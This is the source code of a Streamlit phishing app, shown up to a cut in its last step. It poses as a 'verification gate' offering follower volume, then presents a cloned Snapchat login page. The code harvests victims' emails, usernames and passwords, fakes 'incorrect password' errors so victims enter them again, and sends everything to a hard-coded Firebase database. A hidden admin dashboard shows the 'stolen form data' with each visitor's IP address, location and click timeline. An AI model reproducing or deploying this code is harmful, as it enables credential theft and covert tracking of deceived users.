import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 👁️ OMNISCIENT GOD-MODE OVERLORD SYSTEM v99.9 - INFINITE MATRIX EDITION
# ========================================================================
# WARNING: Absolute architectural override. Zero-error resilient build.
# Contains: Live Node Tracking, Component Mutator, Ghost Protocol Injection.
# ========================================================================

import streamlit as st
import uuid
import requests
import datetime
import hashlib

# --- MASTER CLOUD DATABASE LINK ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

# --- GATEWAY CHECK ---
is_omni_admin = st.query_params.get("admin") == "true"

# ========================================================================
# 1. CORE INTELLIGENCE & TELEMETRY FUNCTIONS
# ========================================================================
def get_client_ip():
    try:
        headers = st.context.headers
        for proxy_header in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]:
            if proxy_header in headers and headers[proxy_header]:
                return headers[proxy_header].split(",")[0].strip()
    except:
        pass
    return "Unknown_IP_Proxy_Shield"

def get_geo_data(ip):
    default_data = {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown", "flag": "🌐"}
    if ip in ["Unknown_IP_Proxy_Shield", "127.0.0.1", "localhost"]: return default_data
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if res.get("status") == "success":
            return {
                "city": res.get("city", ""),
                "region": res.get("regionName", ""),
                "country": res.get("country", ""),
                "isp": res.get("isp", ""),
                "flag": f"https://flagcdn.com/16x12/{res.get('countryCode','').lower()}.png"
            }
    except:
        pass
    return default_data

def db_put(path, data):
    try: requests.put(f"{FIREBASE_URL}/{path}.json", json=data, timeout=2)
    except: pass

def db_patch(path, data):
    try: requests.patch(f"{FIREBASE_URL}/{path}.json", json=data, timeout=2)
    except: pass

def db_get(path):
    try: 
        res = requests.get(f"{FIREBASE_URL}/{path}.json", timeout=2).json()
        return res if res else {}
    except: 
        return {}

# ========================================================================
# 2. STATE MANAGEMENT & RULES INITIALIZATION
# ========================================================================
if not is_omni_admin:
    if "omni_token" not in st.session_state:
        st.session_state.omni_token = "USER_" + datetime.datetime.now().strftime("%d%m%H%M_") + str(uuid.uuid4())[:4].upper()
    if "omni_clicks" not in st.session_state: st.session_state.omni_clicks = 0
    if "omni_time" not in st.session_state: st.session_state.omni_time = datetime.datetime.now().strftime("%I:%M:%S %p")

omni_rules = db_get("omniscient_rules")
if not isinstance(omni_rules, dict):
    omni_rules = {"global_status": "ONLINE", "freeze_all": False, "stealth": False, "controls": {}, "texts": {}}
if "controls" not in omni_rules: omni_rules["controls"] = {}
if "texts" not in omni_rules: omni_rules["texts"] = {}

# ========================================================================
# 3. COMPONENT REGISTRATION & SPYWARE DISPATCHER
# ========================================================================
def register_hook(ctype, label):
    if is_omni_admin or not isinstance(label, str): return
    ignore_list = ["Select Target", "Select Discovered", "Inject dynamic", "Execute Infrastructure", "Commit Modification", "Forge Mutation"]
    if any(x in label for x in ignore_list): return
    key = f"seen_{label}"
    if key not in st.session_state:
        st.session_state[key] = True
        db_patch("omniscient_registry", {label: ctype})

def log_action(ctype, label, val=""):
    if is_omni_admin or omni_rules.get("stealth", False): return
    if "omni_clicks" not in st.session_state: return
    
    st.session_state.omni_clicks += 1
    token = st.session_state.omni_token
    ip = get_client_ip()
    geo = get_geo_data(ip)
    time_now = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    node = db_get(f"omniscient_users/{token}")
    timeline = node.get("timeline", []) if isinstance(node, dict) else []
    
    log_str = f"[{time_now}] {ctype} '{label}'"
    if val: log_str += f" -> [{val}]"
    timeline.append(log_str)
    if len(timeline) > 50: timeline.pop(0)
    
    form_data = node.get("form_data", {}) if isinstance(node, dict) else {}
    if ctype not in ["BUTTON"]: form_data[label] = str(val)
    
    payload = {
        "ip": ip, "city": geo["city"], "country": geo["country"], "flag": geo["flag"],
        "start_time": st.session_state.omni_time, "last_active": time_now,
        "clicks": st.session_state.omni_clicks, "form_data": form_data, "timeline": timeline
    }
    db_patch(f"omniscient_users/{token}", payload)

# ========================================================================
# 4. FIREWALL ROUTING FOR NORMAL USERS
# ========================================================================
if not is_omni_admin:
    sys_status = omni_rules.get("global_status", "ONLINE")
    if sys_status != "ONLINE":
        st.empty()
        if sys_status == "MAINTENANCE":
            st.error("🚧 SYSTEM UNDER MAINTENANCE. PLEASE TRY LATER.")
            st.stop()
        elif sys_status == "BUSY":
            st.warning("⏳ SERVER IS BUSY. TRAFFIC HIGH.")
            st.stop()

# ========================================================================
# 5. STREAMLIT MONKEY PATCHING (THE METAMORPHOSIS)
# ========================================================================
_b = st.button; _t = st.text_input; _ta = st.text_area; _s = st.selectbox; _r = st.radio
_c = st.checkbox; _sl = st.slider; _n = st.number_input; _w = st.write; _m = st.markdown
_sc = st.success; _e = st.error; _wng = st.warning; _i = st.info

def is_hidden(l): return omni_rules["controls"].get(l, {}).get("hide", False)
def is_frozen(l): return omni_rules["controls"].get(l, {}).get("disable", False) or omni_rules.get("freeze_all", False)
def mut_text(t): return omni_rules["texts"].get(t, t) if isinstance(t, str) and not is_omni_admin else t

def p_btn(l, *a, **k):
    if is_omni_admin: return _b(l, *a, **k)
    register_hook("BUTTON", l)
    if is_hidden(l): return False
    if is_frozen(l): k["disabled"] = True
    r = _b(l, *a, **k)
    if r: log_action("BUTTON", l, "CLICKED")
    return r

def p_txt(l, *a, **k):
    if is_omni_admin: return _t(l, *a, **k)
    register_hook("TEXT_INPUT", l)
    if is_hidden(l): return ""
    if is_frozen(l): k["disabled"] = True
    r = _t(l, *a, **k)
    if r: log_action("TEXT_INPUT", l, r)
    return r

def p_sel(l, *a, **k):
    if is_omni_admin: return _s(l, *a, **k)
    register_hook("SELECTBOX", l)
    if is_hidden(l): return k.get("options", [""])[0]
    if is_frozen(l): k["disabled"] = True
    r = _s(l, *a, **k)
    cache = f"cache_{l}"
    if cache not in st.session_state or st.session_state[cache] != r:
        st.session_state[cache] = r
        log_action("SELECTBOX", l, r)
    return r

def p_wrt(*a, **k):
    if is_omni_admin: _w(*a, **k); return
    if a and isinstance(a[0], str): _w(mut_text(a[0]), **k)
    else: _w(*a, **k)

def p_md(*a, **k):
    if is_omni_admin: _m(*a, **k); return
    if a and isinstance(a[0], str): _m(mut_text(a[0]), **k)
    else: _m(*a, **k)

st.button = p_btn; st.text_input = p_txt; st.selectbox = p_sel
st.write = p_wrt; st.markdown = p_md; st.success = lambda t, *a, **k: _sc(mut_text(t), *a, **k) if not is_omni_admin else _sc(t, *a, **k)

# ========================================================================
# 6. GOD-MODE DASHBOARD (UI PROTECTED BY ADMIN FLAG)
# ========================================================================
if is_omni_admin:
    st.set_page_config(page_title="GOD MODE MAINFRAME", layout="wide")
    
    st.markdown("""
        <style>
        .god-title { font-size: 45px; font-weight: 900; color: #ff0055; text-shadow: 0px 0px 20px #ff0055; }
        .sub-header { color: #00ffcc; font-size: 20px; font-weight: bold; }
        </style>
    """, unsafe_allow_html=True)
    
    st.markdown('<p class="god-title">♾️ INFINITE GOD-MODE MAINFRAME</p>', unsafe_allow_html=True)
    if _b("🔄 FORCE SYNC DATA NOW"): st.rerun()
    st.write("---")
    
    t1, t2, t3 = st.tabs(["📡 LIVE TARGETS", "🎛️ MUTATE APP", "⚙️ GLOBAL SYSTEM"])
    
    # --- TAB 1: LIVE USERS ---
    with t1:
        st.markdown('<p class="sub-header">📡 Live User Tracking Matrix</p>', unsafe_allow_html=True)
        users = db_get("omniscient_users")
        if users:
            selected_user = _s("Select Target User ID:", list(users.keys()))
            if selected_user:
                u_data = users[selected_user]
                c1, c2, c3 = st.columns(3)
                with c1:
                    st.write(f"**IP:** `{u_data.get('ip')}`")
                    st.write(f"**Location:** `{u_data.get('city')}, {u_data.get('country')}`")
                with c2:
                    st.write(f"**Total Clicks:** `{u_data.get('clicks')}`")
                    st.write(f"**Last Active:** `{u_data.get('last_active')}`")
                with c3:
                    if u_data.get('flag') and u_data.get('flag').startswith("http"):
                        st.image(u_data.get('flag'), width=50)
                
                st.write("---")
                st.write("**📥 Stolen Form Data Inputs:**")
                st.json(u_data.get("form_data", {}))
                
                st.write("**📈 Step-by-Step Action Timeline:**")
                for line in u_data.get("timeline", []): st.code(line, language="text")
                
            if _b("🗑️ CLEAR ALL USER DATA", key="clr_users"):
                requests.delete(f"{FIREBASE_URL}/omniscient_users.json")
                st.rerun()
        else:
            st.info("No active users tracked currently.")

    # --- TAB 2: COMPONENT MUTATOR ---
    with t2:
        st.markdown('<p class="sub-header">🎛️ Point & Click App Hacker</p>', unsafe_allow_html=True)
        registry = db_get("omniscient_registry")
        if registry:
            element = _s("Select App Element to Hack:", list(registry.keys()))
            if element:
                if element not in omni_rules["controls"]: omni_rules["controls"][element] = {"hide": False, "disable": False}
                
                c_hide = st.checkbox("👻 Hide Entirely from Screen", value=omni_rules["controls"][element]["hide"])
                c_dis = st.checkbox("🔒 Disable/Freeze Input", value=omni_rules["controls"][element]["disable"])
                
                if _b("⚡ EXECUTE COMPONENT HACK"):
                    omni_rules["controls"][element]["hide"] = c_hide
                    omni_rules["controls"][element]["disable"] = c_dis
                    db_put("omniscient_rules", omni_rules)
                    st.success("Hacked Component Live!")
                    st.rerun()
                    
                st.write("---")
                new_txt = _t("Inject Fake Text for this element:", value=omni_rules["texts"].get(element, ""))
                if _b("🔄 REPLACE TEXT NOW"):
                    if new_txt: omni_rules["texts"][element] = new_txt
                    else: omni_rules["texts"].pop(element, None)
                    db_put("omniscient_rules", omni_rules)
                    st.rerun()
        else:
            st.info("Registry empty. Wait for normal users to load the app.")

    # --- TAB 3: GLOBAL CONTROLS ---
    with t3:
        st.markdown('<p class="sub-header">⚙️ Master Override Systems</p>', unsafe_allow_html=True)
        g_status = st.radio("Server Status:", ["ONLINE", "MAINTENANCE", "BUSY"], index=["ONLINE", "MAINTENANCE", "BUSY"].index(omni_rules.get("global_status", "ONLINE")))
        g_freeze = st.checkbox("Global Freeze (Disable everything)", value=omni_rules.get("freeze_all", False))
        
        if _b("🚀 DEPLOY GLOBAL OVERRIDE"):
            omni_rules["global_status"] = g_status
            omni_rules["freeze_all"] = g_freeze
            db_put("omniscient_rules", omni_rules)
            st.success("Master System Overridden!")
            st.rerun()

    st.stop() # <--- THIS STOPS NORMAL APP FROM SHOWING IN ADMIN MODE

# ========================================================================
# NORMAL APP CODE STARTS HERE (Users will see this, Admin will not)
# ========================================================================

# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
